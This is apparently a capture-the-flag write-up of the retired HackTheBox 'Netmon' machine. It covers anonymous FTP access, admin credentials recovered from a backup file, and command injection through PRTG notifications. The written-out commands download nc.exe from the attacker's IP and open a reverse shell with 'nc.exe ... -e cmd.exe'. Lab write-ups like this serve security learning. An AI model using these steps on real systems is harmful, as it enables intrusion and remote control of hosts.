---
title:      'Netmon'
date:       '2022-01-23'
tag:        'htb'
subtag1:    'Windows'
subtag2:    'Enumeration'
subtag3:    'Command Injection'
---

###### Netmon is a retired easy-ranked Windows machine on HacktheBox.


### INFORMATION GATHERING

---
##### nmap scan

![nmap scan](/images/boxes/netmon/nmap.png "nmap scan")
```bash
nmap -sC -sV -Pn -oA Netmon 10.10.10.152
```
Here we discover:
- ftp (Anonymous login permitted)
- Windows RPC
- smb
- Windows server 2008

---
##### ftp exploration

![ftp exploration](/images/boxes/netmon/ftp.png "ftp exploration")
```bash
ftp 10.10.10.152
username: Anonymous
password: _blank_
```

![ftp exploration 2](/images/boxes/netmon/ftp_2.png "ftp exploration 2")

---
##### user.txt
![user flag](/images/boxes/netmon/user_flag.png "user flag")

the user flag was accessible right away

---

##### website exploration
![website explore 1](/images/boxes/netmon/website_explore1.png "website explore 1")
We discover a web app called PRTG Network Monitor
![website explore 2](/images/boxes/netmon/website_explore2.png "website explore 2")
PRTG Network Monitor 18.1.37.13946

---

##### research
![research 1](/images/boxes/netmon/research1.png "research 1")
Research into PRTG Network Monitor 18.1.37 led me to this notice
[https://www.paessler.com/about-prtg-17-4-35-through-18-1-37](https://www.paessler.com/about-prtg-17-4-35-through-18-1-37)

> Delete the following automatically generated copies of the configuration file if they exist:  
• C:\ProgramData\Paessler\PRTG Network Monitor\PRTG Configuration.old


---

##### ftp back in
![ftp exploration 3](/images/boxes/netmon/ftp_3.png "ftp exploration 3")
ftp back in and navigate to _C:\ProgramData\Paessler\PRTG Network Monitor_
and locate a file called _PRTG Configuration.old.bak_

---

##### backup config file examination
Examining the file and searching for _"password>"_ yields:
![config file examination](/images/boxes/netmon/config_file.png "config file examination")
we have credentials now
_prtgadmin/PrTg@dmin2018_. 

these credentials fail however. Since these are old backups, a password guess of _PrTg@dmin2019_ logs in successfully

![website access](/images/boxes/netmon/website_access.png "website access")

---

##### further research
![vulnerability research](/images/boxes/netmon/research2.png "vulnerability research")
full credit to
[https://www.codewatch.org/blog/?p=453](https://www.codewatch.org/blog/?p=453)

notification parameters are not sanitized

### EXPLOITATION

---
##### notifications

![notification home](/images/boxes/netmon/notification_1.png "notification home")
navigate to notification creation center

![notification 2](/images/boxes/netmon/notification_2.png "notification 2")
![notification 3](/images/boxes/netmon/notification_3.png "notification 3")

---
##### server

![set up server](/images/boxes/netmon/server.png "set up server")
set up a simple python3 server to serve a netcat executable

---

##### set up notification

![notification exploit](/images/boxes/netmon/program_1.png "notification exploit")
```bash
Invoke-WebRequest http://10.10.14.19:8000/nc.exe -outfile C:\Users\Public\Downloads\nc.exe
```
here we pass the powershell command in
- _Invoke-WebRequest http://10.10.14.19:8000/nc.exe_ => reach out to my ip address on port 8000 and try to retrieve a file called _nc.exe_
- _-outfile C:\Users\Public\Downloads\nc.exe_ => save the grabbed file to C:\Users\Public\Downloads


---

##### trigger notification

![trigger notification 1](/images/boxes/netmon/trigger_notification_1.png "trigger notification 1")
can trigger the notification on demand

---

##### server check

![server check](/images/boxes/netmon/server2.png "server check")
request was triggered

---

##### ftp check

![ftp check](/images/boxes/netmon/ftp_4.png "ftp check")
file is where it should be

---

##### trigger next notification

![trigger notification 2](/images/boxes/netmon/trigger_notification_2.png "trigger notification 2")
```bash
C:\Users\Public\Downloads\nc.exe 10.10.14.19 7777 -e cmd.exe
```
here we pass the next powershell command in
- _C:\Users\Public\Downloads\nc.exe_ => call the injected file
- _10.10.14.19 7777_ => pass in my ip and port 7777
- _-e cmd.exe_ => execute cmd.exe when connection successful and pass stdin and stdout to the network

---

##### set up netcat listener

![netcat](/images/boxes/netmon/netcat.png "netcat")
```bash
nc -nlvp 7777
```
set up netcat listener on port 7777

---

##### connection successful

![netcat2](/images/boxes/netmon/netcat2.png "netcat2")
connection established on port 7777 upon triggering the second notification
our shell is 

_nt authority/system_ (fully authenticated)

### POST EXPLOITATION

##### root.txt
![root flag](/images/boxes/netmon/root_flag.png "root flag")
root flag was on the desktop of user _Administrator_

### SUMMARY

---
Netmon is an interesting Windows box and relies more heavily on external research than some of the other easy ranked machines. Guessing the year increment for the password was less precise than I would have liked, but had it failed, we could have pursued other avenues. It should be noted that this machine can be rooted extremely quickly using metasploit once the correct password is discovered, effectively trivializing this box.
